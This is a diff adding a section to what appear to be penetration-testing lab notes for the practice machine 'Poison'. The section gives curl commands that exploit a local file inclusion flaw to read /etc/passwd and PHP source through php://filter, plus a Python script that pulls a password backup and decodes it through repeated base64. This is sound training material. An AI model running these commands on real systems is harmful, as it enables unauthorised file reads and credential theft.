@@ -183,6 +183,30 @@ md5sum shell.php
 
 See [[09. Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]], [[09. Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]], [[09. Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]], [[09. Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]], [[09. Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]], [[09. Common Web Application Attacks|Common Web Application Attacks]] (all new techniques above), [[Beep|Beep box writeup]] (null-byte trick).
 
+## Poison: LFI plus mechanical credential extraction
+
+```bash
+# Confirm the include primitive and read PHP source without executing it
+curl -sG "http://$BoxIP/browse.php" --data-urlencode "file=/etc/passwd"
+curl -sG "http://$BoxIP/browse.php" \
+  --data-urlencode "file=php://filter/convert.base64-encode/resource=index.php" \
+  | base64 -d
+
+# Save a multi-line response before decoding it. Keep the decoded result private.
+curl -s "http://$BoxIP/pwdbackup.txt" -o "$BoxDir/loot/pwdbackup.txt"
+python3 - "$BoxDir/loot/pwdbackup.txt" "$BoxDir/loot/decoded-credential.txt" <<'PY'
+import base64, sys
+from pathlib import Path
+src, dst = map(Path, sys.argv[1:])
+value = b"".join(src.read_bytes().splitlines()[2:])
+for _ in range(13):
+    value = base64.b64decode(value)
+dst.write_bytes(value)
+PY
+```
+
+The Poison run confirms that LFI work should include application file listings and backup files, not only `/etc/passwd`. Decode long values mechanically and keep the result out of screenshots and shared notes.
+
 #### Tags: #DirectoryTraversal #LFI #RFI #PHPWrappers #NullByteBypass #NonRecursiveBypass #DoubleURLEncoding #PHPFilters #LogPoisoning #SessionPoisoning #GIFMagicBytes #AutomatedScanning #LFIJhaddix
 
 ---
